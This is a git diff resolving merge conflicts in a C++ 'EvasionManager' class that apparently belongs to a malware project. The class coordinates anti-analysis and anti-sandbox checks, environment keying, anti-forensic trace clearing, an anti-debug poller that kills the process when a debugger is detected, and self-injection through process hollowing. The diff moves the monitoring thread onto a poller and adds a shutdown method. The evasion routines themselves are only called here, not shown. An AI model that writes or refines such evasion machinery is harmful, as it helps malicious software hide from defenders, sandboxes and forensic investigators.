@@ -9,6 +9,7 @@
 #include <chrono>
 #include <atomic>
 #include <cstdlib>
+#include <memory>
 
 #include "domain/common/AntiAnalysis.hpp"
 #include "domain/common/AntiSandbox.hpp"
@@ -35,14 +36,8 @@ class EvasionManager {
     bool environment_keying_enabled_ = true;
     bool anti_forensic_enabled_ = false;
 
-<<<<<<< HEAD
-    // Shutdown flag for monitoring thread
-    static inline std::atomic<bool> shutdown_requested_{false};
-    std::thread monitoring_thread_;
-=======
     // Optimized polling (replaces detached thread)
-    std::unique_ptr<perf::AdaptivePoller> anti_debug_poller_;
->>>>>>> b6a6746c186ea2c4667c715ee5719fc4c166adfc
+    std::unique_ptr<perf::AdaptivePoller> anti_debug_poller_; 
 
 public:
     struct Config {
@@ -134,12 +129,12 @@ public:
             }
         }
 
-<<<<<<< HEAD
         // 7. Anti-forensic (clear traces after passing all checks)
         if (anti_forensic_enabled_) {
             anti::AntiForensic::clear_traces();
-=======
-        // 5. Start anti-debug monitoring (adaptive, not detached)
+        }
+
+        // 8. Start anti-debug monitoring (adaptive, not detached)
         if (anti_debug_enabled_) {
             anti_debug_poller_ = std::make_unique<perf::AdaptivePoller>(
                 [this]() {
@@ -153,21 +148,8 @@ public:
                 std::chrono::milliseconds(5000)  // Start at 5s interval
             );
             anti_debug_poller_->start();
->>>>>>> b6a6746c186ea2c4667c715ee5719fc4c166adfc
         }
 
-        // 8. Start anti-debug monitoring thread (joinable, not detached)
-        if (anti_debug_enabled_) {
-            monitoring_thread_ = std::thread([this]() {
-                while (!shutdown_requested_) {
-                    Sleep(5000);
-                    if (shutdown_requested_) break;
-                    if (anti::AntiDebug::should_terminate()) {
-                        std::exit(1);
-                    }
-                }
-            });
-        }
 
         // 9. Self-inject via process hollowing if configured
         if (process_hollowing_enabled_) {
@@ -180,15 +162,22 @@ public:
         }
     }
 
-    // Request shutdown for monitoring thread
+    // Request shutdown for monitoring/poller
     void request_shutdown() {
-        shutdown_requested_ = true;
+        shutdown();
     }
 
-    // Wait for monitoring thread to finish (call during cleanup)
+    // Wait/cleanup for monitoring (poller has no join)
     void join_monitoring() {
-        if (monitoring_thread_.joinable()) {
-            monitoring_thread_.join();
+        // No join needed for AdaptivePoller; ensure shutdown was called
+        shutdown();
+    }
+
+    // Stop all background monitoring (call before shutdown)
+    void shutdown() {
+        if (anti_debug_poller_) {
+            anti_debug_poller_->stop();
+            anti_debug_poller_.reset();
         }
     }
 
@@ -330,18 +319,12 @@ public:
     bool is_environment_keying_enabled() const { return environment_keying_enabled_; }
     bool is_anti_forensic_enabled() const { return anti_forensic_enabled_; }
 
-<<<<<<< HEAD
 private:
-    // Sleep in stealth mode, checking for shutdown
+    // Sleep in stealth mode (blocks indefinitely)
     static void stealth_sleep() {
-        while (!shutdown_requested_) {
+        while (true) {
             Sleep(10000);
         }
-=======
-    // Stop all background monitoring (call before shutdown)
-    void shutdown() {
-        if (anti_debug_poller_) anti_debug_poller_->stop();
->>>>>>> b6a6746c186ea2c4667c715ee5719fc4c166adfc
     }
 };
 
